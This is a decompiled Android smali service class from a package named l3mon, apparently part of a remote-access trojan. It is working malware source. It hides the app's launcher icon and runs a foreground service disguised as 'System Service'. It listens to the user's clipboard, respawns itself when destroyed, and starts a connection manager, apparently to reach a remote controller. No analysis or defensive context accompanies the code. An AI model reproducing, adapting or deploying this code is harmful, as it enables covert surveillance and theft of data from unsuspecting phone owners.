.class public Lcom/etechd/l3mon/MainService;
.super Landroid/app/Service;
.source "MainService.java"

.field private static final NOTIFICATION_ID:I = 0x3e7
.field private static final CHANNEL_ID:Ljava/lang/String; = "andro_channel"
.field private static contextOfApplication:Landroid/content/Context;

# direct methods
.method public constructor <init>()V
    .locals 0

    .line 25
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 27
    return-void
.end method

.method private createNotificationChannel()V
    .locals 4

    .line 90
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_0

    .line 91
    new-instance v0, Landroid/app/NotificationChannel;

    const-string v1, "andro_channel"

    const-string v2, "System Service"

    const/4 v3, 0x0

    invoke-direct {v0, v1, v2, v3}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 93
    .local v0, "channel":Landroid/app/NotificationChannel;
    const-string v2, "System Service Channel"

    invoke-virtual {v0, v2}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    .line 94
    invoke-virtual {v0, v3}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    .line 95
    const-string v2, "notification"

    invoke-virtual {p0, v2}, Lcom/etechd/l3mon/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/NotificationManager;

    .line 96
    .local v2, "notificationManager":Landroid/app/NotificationManager;
    invoke-virtual {v2, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 98
    .end local v0    # "channel":Landroid/app/NotificationChannel;
    .end local v2    # "notificationManager":Landroid/app/NotificationManager;
    :cond_0
    return-void
.end method

.method private startForeground()V
    .locals 4

    .line 101
    invoke-direct {p0}, Lcom/etechd/l3mon/MainService;->createNotificationChannel()V

    .line 103
    new-instance v0, Landroid/app/Notification$Builder;

    invoke-direct {v0, p0}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;)V

    .line 104
    .local v0, "notificationBuilder":Landroid/app/Notification$Builder;
    const-string v1, "System Service"

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    .line 105
    const-string v1, "Running..."

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    .line 106
    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    .line 108
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt v1, v2, :cond_0

    .line 109
    const-string v1, "andro_channel"

    invoke-virtual {v0, v1}, Landroid/app/Notification$Builder;->setChannelId(Ljava/lang/String;)Landroid/app/Notification$Builder;

    .line 112
    :cond_0
    invoke-virtual {v0}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v1

    .line 113
    .local v1, "notification":Landroid/app/Notification;
    const/16 v2, 0x3e7

    invoke-virtual {p0, v2, v1}, Lcom/etechd/l3mon/MainService;->startForeground(ILandroid/app/Notification;)V

    .line 114
    return-void
.end method

.method public static getContextOfApplication()Landroid/content/Context;
    .locals 1

    .line 86
    sget-object v0, Lcom/etechd/l3mon/MainService;->contextOfApplication:Landroid/content/Context;

    return-object v0
.end method

# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .line 33
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 0

    .line 38
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 39
    invoke-direct {p0}, Lcom/etechd/l3mon/MainService;->startForeground()V

    .line 40
    return-void
.end method

.method public onDestroy()V
    .locals 2

    .line 76
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 77
    new-instance v0, Landroid/content/Intent;

    const-string v1, "respawnService"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Lcom/etechd/l3mon/MainService;->sendBroadcast(Landroid/content/Intent;)V

    .line 78
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 4
    .param p1, "paramIntent"    # Landroid/content/Intent;
    .param p2, "paramInt1"    # I
    .param p3, "paramInt2"    # I

    .line 45
    invoke-virtual {p0}, Lcom/etechd/l3mon/MainService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    .line 46
    .local v0, "pkg":Landroid/content/pm/PackageManager;
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/etechd/l3mon/MainActivity;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v2, 0x1

    const/4 v3, 0x2

    invoke-virtual {v0, v1, v3, v2}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 50
    new-instance v1, Lcom/etechd/l3mon/MainService$1;

    invoke-direct {v1, p0}, Lcom/etechd/l3mon/MainService$1;-><init>(Lcom/etechd/l3mon/MainService;)V

    .line 65
    .local v1, "mPrimaryChangeListener":Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;
    const-string v3, "clipboard"

    invoke-virtual {p0, v3}, Lcom/etechd/l3mon/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/content/ClipboardManager;

    .line 66
    .local v3, "clipboardManager":Landroid/content/ClipboardManager;
    invoke-virtual {v3, v1}, Landroid/content/ClipboardManager;->addPrimaryClipChangedListener(Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;)V

    .line 69
    sput-object p0, Lcom/etechd/l3mon/MainService;->contextOfApplication:Landroid/content/Context;

    .line 70
    invoke-static {p0}, Lcom/etechd/l3mon/ConnectionManager;->startAsync(Landroid/content/Context;)V

    .line 71
    return v2
.end method
